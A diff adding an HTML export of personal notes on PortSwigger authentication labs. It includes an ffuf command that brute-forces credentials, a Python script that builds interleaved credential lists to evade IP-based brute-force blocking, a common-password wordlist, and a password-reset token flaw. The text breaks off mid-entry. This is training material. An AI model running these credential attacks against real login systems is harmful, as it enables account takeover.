@@ -1,0 +1,936 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>Practical Web Hacking(PWH)</title><style>
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 3px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	padding-inline-start: 0;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+.page-description {
+	margin-bottom: 2em;
+}
+
+.simple-table {
+	margin-top: 1em;
+	font-size: 0.875rem;
+	empty-cells: show;
+}
+.simple-table td {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table th {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table-header-color {
+	background: rgb(247, 246, 243);
+	color: black;
+}
+.simple-table-header {
+	font-weight: 500;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-block;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	max-height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1.25em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.highlight-default {
+	color: rgba(50, 48, 44, 1);
+}
+.highlight-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.highlight-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.highlight-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.highlight-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.highlight-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.highlight-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.highlight-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.highlight-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.highlight-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.highlight-default_background {
+	color: rgba(50, 48, 44, 1);
+}
+.highlight-gray_background {
+	background: rgba(248, 248, 247, 1);
+}
+.highlight-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.highlight-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.highlight-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.highlight-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.highlight-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.highlight-purple_background {
+	background: rgba(248, 243, 252, 1);
+}
+.highlight-pink_background {
+	background: rgba(252, 241, 246, 1);
+}
+.highlight-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.block-color-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.block-color-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.block-color-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.block-color-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.block-color-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.block-color-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.block-color-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.block-color-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.block-color-default_background {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray_background {
+	background: rgba(248, 248, 247, 1);
+}
+.block-color-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.block-color-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.block-color-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.block-color-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.block-color-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.block-color-purple_background {
+	background: rgba(248, 243, 252, 1);
+}
+.block-color-pink_background {
+	background: rgba(252, 241, 246, 1);
+}
+.block-color-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.select-value-color-uiBlue { background-color: undefined; }
+.select-value-color-pink { background-color: rgba(225, 136, 179, 0.27); }
+.select-value-color-purple { background-color: rgba(168, 129, 197, 0.27); }
+.select-value-color-green { background-color: rgba(123, 183, 129, 0.27); }
+.select-value-color-gray { background-color: rgba(84, 72, 49, 0.15); }
+.select-value-color-transparentGray { background-color: undefined; }
+.select-value-color-translucentGray { background-color: undefined; }
+.select-value-color-orange { background-color: rgba(224, 124, 57, 0.27); }
+.select-value-color-brown { background-color: rgba(210, 162, 141, 0.35); }
+.select-value-color-red { background-color: rgba(244, 171, 159, 0.4); }
+.select-value-color-yellow { background-color: rgba(236, 191, 66, 0.39); }
+.select-value-color-blue { background-color: rgba(93, 165, 206, 0.27); }
+.select-value-color-pageGlass { background-color: undefined; }
+.select-value-color-washGlass { background-color: undefined; }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="1782063d-f08b-8088-a0e0-dfca68480fe1" class="page sans"><header><img class="page-cover-image" src="https://images.unsplash.com/photo-1511287381215-8c58b84f8896?ixlib=rb-4.0.3&amp;q=85&amp;fm=jpg&amp;crop=entropy&amp;cs=srgb" style="object-position:center 62.93%"/><div class="page-header-icon page-header-icon-with-cover"><span class="icon">🏰</span></div><h1 class="page-title"><strong>Practical Web Hacking(PWH)</strong></h1><p class="page-description"></p></header><div class="page-body"><ul id="1792063d-f08b-8027-a51f-ddf2e3aa131c" class="toggle"><li><details open=""><summary><strong>Authentication</strong></summary><ul id="17a2063d-f08b-806e-b06f-d8409fd263f3" class="toggle"><li><details open=""><summary><a href="https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-different-responses">https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-different-responses</a></summary><figure id="17b2063d-f08b-800a-9574-d38c6520e9c5" class="image"><a href="image.png"><img style="width:652px" src="image.png"/></a></figure><p id="17b2063d-f08b-804f-a8b6-cba89fa13a79" class="">for fuzzing password and username both at one time</p><p id="17b2063d-f08b-8054-9cec-ecf408268c14" class=""><code>ffuf  -request req1.txt   -request-proto https  -mode clusterbomb  -w /home/kali/Desktop/usernams.txt:FUZZUSER  -w /home/kali/Desktop/password.txt:FUZZPASS    -fl 64   </code></p><figure id="17b2063d-f08b-8001-a605-fb3fa15585a8" class="image"><a href="image%201.png"><img style="width:651.9750366210938px" src="image%201.png"/></a></figure><figure id="17b2063d-f08b-80d5-b1a9-c3cdad03337b" class="image"><a href="image%202.png"><img style="width:652px" src="image%202.png"/></a></figure></details></li></ul><ul id="17b2063d-f08b-80cc-85b7-e0d04e933b62" class="toggle"><li><details open=""><summary><a href="https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-simple-bypass">https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-simple-bypass</a></summary><figure id="17b2063d-f08b-8091-9823-c1cb3b2865a0" class="image"><a href="image%203.png"><img style="width:652px" src="image%203.png"/></a></figure><figure id="17b2063d-f08b-8020-b89d-d135fb1bd86f" class="image"><a href="image%204.png"><img style="width:652px" src="image%204.png"/></a></figure><figure id="17b2063d-f08b-801c-a3a2-e264b06348f6" class="image"><a href="image%205.png"><img style="width:652px" src="image%205.png"/></a></figure></details></li></ul><ul id="17b2063d-f08b-8046-81ea-cc65fec79897" class="toggle"><li><details open=""><summary><a href="https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-broken-logic">https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-broken-logic</a></summary><figure id="17b2063d-f08b-807a-9b20-f025adea708c" class="image"><a href="image%206.png"><img style="width:652px" src="image%206.png"/></a></figure><figure id="17b2063d-f08b-80fc-a0c3-d6d77e2ee37e" class="image"><a href="image%207.png"><img style="width:652px" src="image%207.png"/></a></figure><figure id="17b2063d-f08b-80ee-b60a-d84171e94161" class="image"><a href="image%208.png"><img style="width:652px" src="image%208.png"/></a></figure><figure id="17b2063d-f08b-80b4-a59e-cf60aaeadd8e" class="image"><a href="image%209.png"><img style="width:652px" src="image%209.png"/></a></figure><figure id="17b2063d-f08b-80d4-996a-d4db59da952c" class="image"><a href="image%2010.png"><img style="width:652px" src="image%2010.png"/></a></figure><p id="17b2063d-f08b-800a-aa05-f6b74b4544de" class="">this lab is vulnerable for <code>temp-forgot-password-token=</code>  it has two  <code>temp-forgot-password-token=</code> if both has same value it will allow to access the carlos account the <code>temp-forgot-password-token=</code> could be anything </p></details></li></ul><ul id="17b2063d-f08b-80ed-92e7-e232ea9125af" class="toggle"><li><details open=""><summary><a href="https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-subtly-different-responses">https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-subtly-different-responses</a></summary><p id="17b2063d-f08b-8051-9754-eb07dde54005" class="">
+</p><p id="17b2063d-f08b-8028-bd7d-d129dd19173d" class="">
+</p></details></li></ul><ul id="17b2063d-f08b-8089-b1df-f6a878dd1340" class="toggle"><li><details open=""><summary><a href="https://portswigger.net/web-security/authentication/password-based/lab-broken-bruteforce-protection-ip-block">https://portswigger.net/web-security/authentication/password-based/lab-broken-bruteforce-protection-ip-block</a></summary><figure id="17c2063d-f08b-80dc-bed0-c4bddb4d670c" class="image"><a href="image%2011.png"><img style="width:652px" src="image%2011.png"/></a></figure><ul id="17c2063d-f08b-80cb-9346-f3433bdb2c7c" class="bulleted-list"><li style="list-style-type:disc">every two attapts wrong username(carlos) &amp;password(peter) the give it right username(wiener)&amp;password(peter)</li></ul><figure id="17c2063d-f08b-809f-8c43-c992e85bbac5" class="image"><a href="image%2012.png"><img style="width:651.9874877929688px" src="image%2012.png"/></a></figure><ul id="17c2063d-f08b-80f7-938d-d0c088e14a4f" class="bulleted-list"><li style="list-style-type:disc">python code for making username and password </li></ul><p id="17c2063d-f08b-80be-beb2-da7ecbb2ecac" class=""><code>print(&quot;########the following are the username############&quot;)<br/>for i in range(150):<br/>if i% 3:<br/>print(&quot;carlos&quot;)<br/>else:<br/>print(&quot;wiener&quot;)<br/></code></p><p id="17c2063d-f08b-808c-95d3-d7431855dac5" class=""><code>print(&quot;#############the following are the passwords:##############&quot;)<br/>with open(&#x27;pass.txt&#x27;,&#x27;r&#x27;) as f:<br/>lines =f.readlines()<br/></code></p><p id="17c2063d-f08b-8080-8e0e-f5dfbdc957a0" class=""><code>i=0<br/>for pwd in lines:<br/>if i%3:<br/>print(pwd.strip(&#x27;\n&#x27;))<br/>else:<br/>print(&quot;peter&quot;)<br/>print(pwd.strip(&#x27;\n&#x27;))<br/>i=i+1<br/>i=i+1<br/></code></p><ul id="17c2063d-f08b-80e2-bd73-f4cbbcc91e1c" class="toggle"><li><details open=""><summary>output of the code </summary><p id="17c2063d-f08b-8096-ad24-f29c62f12359" class="">########the following are the username############<br/>wiener<br/>carlos<br/>carlos<br/>wiener<br/>carlos<br/>carlos<br/>wiener<br/>carlos<br/>carlos<br/>wiener<br/>carlos<br/>carlos<br/>wiener<br/>carlos<br/>carlos<br/>wiener<br/>carlos<br/>carlos<br/>wiener<br/>carlos<br/>carlos<br/>wiener<br/>carlos<br/>carlos<br/>wiener<br/>carlos<br/>carlos<br/>wiener<br/>carlos<br/>carlos<br/>wiener<br/>carlos<br/>carlos<br/>wiener<br/>carlos<br/>carlos<br/>wiener<br/>carlos<br/>carlos<br/>wiener<br/>carlos<br/>carlos<br/>wiener<br/>carlos<br/>carlos<br/>wiener<br/>carlos<br/>carlos<br/>wiener<br/>carlos<br/>carlos<br/>wiener<br/>carlos<br/>carlos<br/>wiener<br/>carlos<br/>carlos<br/>wiener<br/>carlos<br/>carlos<br/>wiener<br/>carlos<br/>carlos<br/>wiener<br/>carlos<br/>carlos<br/>wiener<br/>carlos<br/>carlos<br/>wiener<br/>carlos<br/>carlos<br/>wiener<br/>carlos<br/>carlos<br/>wiener<br/>carlos<br/>carlos<br/>wiener<br/>carlos<br/>carlos<br/>wiener<br/>carlos<br/>carlos<br/>wiener<br/>carlos<br/>carlos<br/>wiener<br/>carlos<br/>carlos<br/>wiener<br/>carlos<br/>carlos<br/>wiener<br/>carlos<br/>carlos<br/>wiener<br/>carlos<br/>carlos<br/>wiener<br/>carlos<br/>carlos<br/>wiener<br/>carlos<br/>carlos<br/>wiener<br/>carlos<br/>carlos<br/>wiener<br/>carlos<br/>carlos<br/>wiener<br/>carlos<br/>carlos<br/>wiener<br/>carlos<br/>carlos<br/>wiener<br/>carlos<br/>carlos<br/>wiener<br/>carlos<br/>carlos<br/>wiener<br/>carlos<br/>carlos<br/>wiener<br/>carlos<br/>carlos<br/>wiener<br/>carlos<br/>carlos<br/>wiener<br/>carlos<br/>carlos<br/>wiener<br/>carlos<br/>carlos<br/>wiener<br/>carlos<br/>carlos<br/>wiener<br/>carlos<br/>carlos<br/>wiener<br/>carlos<br/>carlos<br/>wiener<br/>carlos<br/>carlos<br/>#############the following are the passwords:##############<br/>peter<br/>123456<br/>password<br/>peter<br/>12345678<br/>qwerty<br/>peter<br/>123456789<br/>12345<br/>peter<br/>1234<br/>111111<br/>peter<br/>1234567<br/>dragon<br/>peter<br/>123123<br/>baseball<br/>peter<br/>abc123<br/>football<br/>peter<br/>monkey<br/>letmein<br/>peter<br/>shadow<br/>master<br/>peter<br/>666666<br/>qwertyuiop<br/>peter<br/>123321<br/>mustang<br/>peter<br/>1234567890<br/>michael<br/>peter<br/>654321<br/>superman<br/>peter<br/>1qaz2wsx<br/>7777777<br/>peter<br/>121212<br/>000000<br/>peter<br/>qazwsx<br/>123qwe<br/>peter<br/>killer<br/>trustno1<br/>peter<br/>jordan<br/>jennifer<br/>peter<br/>zxcvbnm<br/>asdfgh<br/>peter<br/>hunter<br/>buster<br/>peter<br/>soccer<br/>harley<br/>peter<br/>batman<br/>andrew<br/>peter<br/>tigger<br/>sunshine<br/>peter<br/>iloveyou<br/>2000<br/>peter<br/>charlie<br/>robert<br/>peter<br/>thomas<br/>hockey<br/>peter<br/>ranger<br/>daniel<br/>peter<br/>starwars<br/>klaster<br/>peter<br/>112233<br/>george<br/>peter<br/>computer<br/>michelle<br/>peter<br/>jessica<br/>pepper<br/>peter<br/>1111<br/>zxcvbn<br/>peter<br/>555555<br/>11111111<br/>peter<br/>131313<br/>freedom<br/>peter<br/>777777<br/>pass<br/>peter<br/>maggie<br/>159753<br/>peter<br/>aaaaaa<br/>ginger<br/>peter<br/>princess<br/>joshua<br/>peter<br/>cheese<br/>amanda<br/>peter<br/>summer<br/>love<br/>peter<br/>ashley<br/>nicole<br/>peter<br/>chelsea<br/>biteme<br/>peter<br/>matthew<br/>access<br/>peter<br/>yankees<br/>987654321<br/>peter<br/>dallas<br/>austin<br/>peter<br/>thunder<br/>taylor<br/>peter<br/>matrix<br/>mobilemail<br/>peter<br/>mom<br/>monitor<br/>peter<br/>monitoring<br/>montana<br/>peter<br/>moon<br/>moscow<br/></p></details></li></ul><figure id="17c2063d-f08b-8066-8909-d2d84a7340cc" class="image"><a href="image%2013.png"><img style="width:652px" src="image%2013.png"/></a></figure><figure id="17c2063d-f08b-803e-befa-c56926045df1" class="image"><a href="image%2014.png"><img style="width:652px" src="image%2014.png"/></a></figure><figure id="17c2063d-f08b-8003-a03f-d5aab6417221" class="image"><a href="image%2015.png"><img style="width:652px" src="image%2015.png"/></a></figure><figure id="17c2063d-f08b-80db-90b9-d7d0de74128e" class="image"><a href="image%2016.png"><img style="width:652px" src="image%2016.png"/></a></figure><p id="17c2063d-f08b-8010-8719-e7460a9fd110" class="">then lab solved !</p></details></li></ul><ul id="17c2063d-f08b-807b-b706-da8ec7ea52a2" class="toggle"><li><details open=""><summary><a href="https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-account-lock">https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-account-lock</a></summary><p id="17c2063d-f08b-80be-b892-f5d88645098a" class="">
+</p></details></li></ul><ul id="17c2063d-f08b-8046-9d77-c28f0569a4bf" class="toggle"><li><details open=""><summary><a href="https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-broken-logic">https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-broken-logic</a></summary><figure id="17c2063d-f08b-809f-a124-f8fd094cb640" class="image"><a href="image%2017.png"><img style="width:652px" src="image%2017.png"/></a></figure><figure id="17c2063d-f08b-80e4-b710-cba4f55f0c24" class="image"><a href="image%2018.png"><img style="width:652px" src="image%2018.png"/></a></figure><figure id="17c2063d-f08b-809a-9e42-fe0419a1c590" class="image"><a href="image%2019.png"><img style="width:652px" src="image%2019.png"/></a></figure><figure id="17c2063d-f08b-80c2-941f-d7e6bc2eea47" class="image"><a href="image%2020.png"><img style="width:652px" src="image%2020.png"/></a></figure><figure id="17c2063d-f08b-80f1-b0e0-f794ad4a8bf4" class="image"><a href="image%2021.png"><img style="width:652px" src="image%2021.png"/></a></figure><figure id="17c2063d-f08b-8009-bcd7-c04bdff28bec" class="image"><a href="image%2022.png"><img style="width:652px" src="image%2022.png"/></a></figure><p id="17c2063d-f08b-8029-a2c6-d4a687fd9d23" class="">then update cookie in the browser and delete wiener then type in url </p><p id="17c2063d-f08b-8075-87dd-d0abd90fbba3" class=""><code> 